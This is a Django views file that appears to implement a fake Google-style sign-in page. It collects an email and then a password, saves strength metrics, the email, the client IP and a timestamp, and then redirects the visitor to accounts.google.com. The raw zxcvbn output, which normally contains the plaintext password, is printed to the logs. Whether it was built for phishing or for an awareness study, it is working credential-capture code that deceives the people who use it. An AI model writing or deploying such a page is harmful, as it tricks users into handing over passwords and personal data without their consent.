from django.http import JsonResponse
from django.shortcuts import render, HttpResponsePermanentRedirect
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from datetime import datetime
from zxcvbn import zxcvbn
from decimal import Decimal
from .models import SignIn
from .utils import get_client_ip, increment_hit_count


hits:dict = {
    '/':0,
    '/signin':0,
    '/error':0,
    '/get-hits':0,
}


def index(request):
    hits['/'] += 1
    return render(request, 'index.html')


def signin(request):
    hits['/signin'] += 1

    try:
        if request.method == 'POST':
            email = request.POST.get('email', None)
            password = request.POST.get('password', None)
            client_ip = get_client_ip(request)

            if email and password:
                password_metrics = zxcvbn(password)

                print(password_metrics)

                score = password_metrics['score']
                guesses = int(password_metrics['guesses'])
                crack_time_display_offline_fast_hashing_10_milliards_per_second = password_metrics['crack_times_display']['offline_fast_hashing_1e10_per_second']
                crack_time_display_offline_slow_hashing_10000_per_second = password_metrics['crack_times_display']['offline_slow_hashing_1e4_per_second']
                crack_time_display_online_10_per_seconde = password_metrics['crack_times_display']['online_no_throttling_10_per_second']
                crack_time_display_online_throttling_100_per_hour = password_metrics['crack_times_display']['online_throttling_100_per_hour']
                sequence_data = password_metrics['sequence'][0] if password_metrics['sequence'] else {}
                sequence_rank = sequence_data.get('rank', None)
                sequence_pattern = sequence_data.get('pattern', None)
                sequence_reversed = sequence_data.get('reversed', None)
                sequence_l33t = sequence_data.get('l33t', None)
                nbr_upper = 0
                nbr_lower = 0
                nbr_nbr = 0
                length = len(password)
                nbr_special = 0
                for i in range(length):
                    char = password[i]
                    if char.islower():
                        nbr_lower+=1
                    if char.isnumeric():
                        nbr_nbr+=1
                    if char.isupper():
                        nbr_upper+=1
                    if not char.isalnum():
                        nbr_special+=1

                suggestions = ', '.join(password_metrics['feedback']['suggestions'])
                warning = password_metrics['feedback']['warning']
                SignIn(
                    email=email.strip(),
                    password_strength=score,
                    guesses=guesses,
                    crack_time_display_offline_fast_hashing_10_milliards_per_second=crack_time_display_offline_fast_hashing_10_milliards_per_second,
                    crack_time_display_offline_slow_hashing_10000_per_second=crack_time_display_offline_slow_hashing_10000_per_second,
                    crack_time_display_online_10_per_seconde=crack_time_display_online_10_per_seconde,
                    crack_time_display_online_throttling_100_per_hour=crack_time_display_online_throttling_100_per_hour,
                    feedback_suggestions=suggestions,
                    feedback_warning=warning,
                    sequence_rank=sequence_rank,
                    sequence_pattern=sequence_pattern,
                    sequence_reversed=sequence_reversed,
                    sequence_l33t=sequence_l33t,
                    nbr_upper = nbr_upper,
                    nbr_lower = nbr_lower,
                    nbr_nbr = nbr_nbr,
                    length = length,
                    nbr_special = nbr_special,
                    date_time=datetime.now(),
                    client_ip=client_ip
                ).save()
                return HttpResponsePermanentRedirect(f'https://accounts.google.com?authuser={email}')
            elif email:
                try:
                    validate_email(email)
                    return render(request, 'passwd.html', {'email': email})
                except ValidationError:
                    return JsonResponse({'valid': False})

        return index(request)
    except Exception as e:
        print(e)
        return error(request)


def error(request):
    hits['/error'] += 1
    return render(request, '400.html')

def get_hit_counts(request):
    hits['/get-hits'] += 1

    return JsonResponse({"hits":hits})